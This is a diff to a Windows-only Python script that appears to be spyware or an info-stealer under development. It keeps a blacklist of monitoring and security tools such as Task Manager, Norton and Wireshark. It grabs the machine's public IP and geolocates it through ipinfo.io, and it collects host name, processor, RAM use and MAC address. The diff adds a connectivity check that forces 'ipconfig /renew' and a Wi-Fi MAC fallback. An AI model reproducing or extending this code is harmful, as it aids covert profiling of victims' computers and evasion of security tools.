@@ -1,4 +1,3 @@
-import json
 import httpx
 import os
 import platform
@@ -15,6 +14,7 @@ blackListedPrograms = ["Taskmgr.exe","NortonSecurity.exe","Wireshark.exe","bdage
 
 
 if platform.system() == "Windows":
+
     load_dotenv()
     API_KEY = os.getenv("TOKEN")
 
@@ -35,6 +35,15 @@ if platform.system() == "Windows":
         except FileNotFoundError:
             os.mkdir(home+"\\Desktop\\Test")
             continue
+    def test():
+        ip = httpx.get("https://ident.me").text
+        statuscode = httpx.get(f"https://ipinfo.io/{ip}/json?token={API_KEY}").status_code
+        if statuscode == 404:
+            os.system("ipconfig /renew")
+            return
+        elif statuscode == 200:
+            return
+        
     
     def fileloc(home):
         filepath = sys.argv[0]
@@ -69,7 +78,11 @@ if platform.system() == "Windows":
         node = platform.node()
         processor = platform.processor()
         rampercent = dict(psutil.virtual_memory()._asdict())["percent"]
-        macaddress = psutil.net_if_addrs()["Ethernet"][0][1]
+        try:
+            macaddress = psutil.net_if_addrs()["Ethernet"][0][1]
+        except KeyError:
+            macaddress = psutil.net_if_addrs()["Wi-Fi"][0][1]
+
         while True:
             try:
                 os.chdir(home+"\\Desktop\\Test")
@@ -107,10 +120,11 @@ if platform.system() == "Windows":
                 os.mkdir(home+"\\Desktop\\Test")
                 continue
     
-    fileloc()
+    test()
+    #fileloc()
     ipinfo(ipreq(ipgrabber()))
     otherinfo()
-    currunproc()
+    #currunproc()
 
 else:
     raise SystemExit
